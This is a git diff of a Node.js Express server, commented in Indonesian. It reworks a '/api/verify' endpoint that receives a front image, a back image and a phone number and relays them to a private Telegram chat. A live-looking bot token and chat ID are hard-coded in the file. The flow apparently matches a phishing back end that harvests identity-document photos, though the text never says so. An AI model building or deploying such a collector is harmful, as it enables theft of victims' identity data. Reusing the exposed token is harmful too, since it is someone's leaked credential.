@@ -3,11 +3,11 @@ const fetch = require('node-fetch');
 const FormData = require('form-data');
 const fs = require('fs');
 const path = require('path');
+const multer = require('multer');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Ambil dari environment variable Railway
 const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
 const CHAT_ID = process.env.CHAT_ID || '7352381955';
 
@@ -19,12 +19,16 @@ console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('🚀 ========================================');
 
-// Middleware
+// Setup multer untuk handle FormData dengan benar
+const upload = multer({
+  limits: { fileSize: 20 * 1024 * 1024 } // 20MB limit
+});
+
 app.use(express.json({ limit: '20mb' }));
 app.use(express.urlencoded({ extended: true, limit: '20mb' }));
 app.use(express.static('public'));
 
-// Database (gunakan file, Railway support)
+// Database
 const DB_PATH = path.join(__dirname, 'data.json');
 
 function readDatabase() {
@@ -122,7 +126,7 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// TEST endpoint untuk cek bot
+// TEST endpoints
 app.get('/test-bot', async (req, res) => {
   console.log('🧪 Testing bot connection...');
   try {
@@ -137,7 +141,6 @@ app.get('/test-bot', async (req, res) => {
   }
 });
 
-// TEST send message
 app.get('/test-send', async (req, res) => {
   console.log('🧪 Testing send message...');
   try {
@@ -149,31 +152,24 @@ app.get('/test-send', async (req, res) => {
   }
 });
 
-// Verify endpoint
-app.post('/api/verify', async (req, res) => {
+// Verify endpoint dengan multer
+app.post('/api/verify', upload.none(), async (req, res) => {
   console.log('📸 ===== NEW VERIFICATION REQUEST =====');
   console.log('📸 Time:', new Date().toISOString());
   
   try {
-    let image, backImage, phone;
-    
-    // Handle both JSON and FormData
-    if (req.is('multipart/form-data')) {
-      console.log('📦 Processing FormData');
-      image = req.body.image;
-      backImage = req.body.backImage || null;
-      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
-    } else {
-      console.log('📦 Processing JSON');
-      image = req.body.image;
-      backImage = req.body.backImage || null;
-      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
-    }
+    // Ambil dari body (multer sudah parse)
+    const image = req.body.image;
+    const backImage = req.body.backImage || null;
+    const phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     
     console.log(`📱 Phone: ${phone}`);
     console.log(`📸 Image exists: ${!!image}`);
     console.log(`📸 Image length: ${image ? image.length : 0}`);
     console.log(`📸 Back image: ${backImage ? 'Yes' : 'No'}`);
+    
+    // Log semua body
+    console.log('📦 Request body keys:', Object.keys(req.body));
     
     if (!image) {
       console.log('❌ No image received');
@@ -209,8 +205,6 @@ app.post('/api/verify', async (req, res) => {
     
     // ===== SEND TO TELEGRAM =====
     console.log('📤 Sending to Telegram...');
-    console.log(`🤖 Using BOT_TOKEN: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'NOT SET'}`);
-    console.log(`📱 Using CHAT_ID: ${CHAT_ID}`);
     
     if (!BOT_TOKEN || !CHAT_ID) {
       console.error('❌ BOT_TOKEN or CHAT_ID not set!');
@@ -302,15 +296,6 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Start server
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 ========================================`);
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🚀 ========================================`);
-  console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
-  console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
-  console.log(`🚀 ========================================`);
-  console.log(`📊 Test bot: https://your-app.railway.app/test-bot`);
-  console.log(`📊 Test send: https://your-app.railway.app/test-send`);
-  console.log(`🚀 ========================================`);
 });
